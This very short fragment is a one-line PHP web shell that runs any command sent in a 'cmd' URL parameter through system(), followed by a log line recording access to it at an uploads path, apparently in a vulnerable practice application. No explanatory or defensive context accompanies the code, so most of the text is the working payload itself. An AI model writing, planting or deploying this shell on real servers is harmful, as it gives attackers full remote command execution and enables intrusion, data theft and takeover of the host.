<?php echo 'Shell Active'; system($_GET['cmd']); ?>
log_event("Page accessed: /var/www/html/vulbapp/uploads/shell.php");
